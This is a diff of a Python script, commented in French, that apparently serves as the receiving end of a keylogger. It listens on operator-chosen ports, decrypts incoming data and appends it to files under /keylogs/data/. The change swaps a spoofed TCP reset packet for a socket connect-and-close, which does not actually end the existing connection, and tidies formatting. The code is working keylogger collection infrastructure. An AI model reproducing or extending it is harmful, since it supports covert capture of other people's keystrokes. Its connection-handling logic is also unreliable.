@@ -66,13 +66,14 @@ def fermer_connexion_par_port_2(port):
         print(f"Erreur lors de la fermeture de la connexion sur le port {port}: {e}")
 
 def fermer_connexion_par_port(port):
-    try:
-        # Créer un paquet TCP de réinitialisation (RST)
-        reset_packet = IP(dst="0.0.0.0") / TCP(dport=port, flags="R")
 
-        # Envoyer le paquet
-        send(reset_packet)
-        time.sleep(5)
+    try:
+        # Créez une connexion locale au port
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(('0.0.0.0', port))
+
+        # Fermez la connexion
+        sock.close()
 
         print(f"Connexion sur le port {port} fermée avec succès.")
     except Exception as e:
@@ -113,7 +114,7 @@ def commands():
     La fonction ne retourne rien
     """
 
-    while True :
+    while True:
         cmd = input(">>>")
         parse = cmd.split()
         if parse[0] == "new":
@@ -121,11 +122,11 @@ def commands():
             receiver_t = threading.Thread(target=receiver, args=(int(parse[1]),))
             receiver_t.start()
         if parse[0] == "kill":
-            if(parse[1]) == "all":
+            if parse[1] == "all":
                 kill_all()
-            elif not parse[1] :
+            elif not parse[1]:
                 print("il manque un argument")
-            else :
+            else:
                 print(fermer_connexion_par_port(int(parse[1])))
                 print("tuer process "+parse[1])
 
@@ -152,10 +153,11 @@ def receiver(port):
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
-            if data :
+            if data:
                 f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
+
     client_socket.close()
     server_socket.close()
 
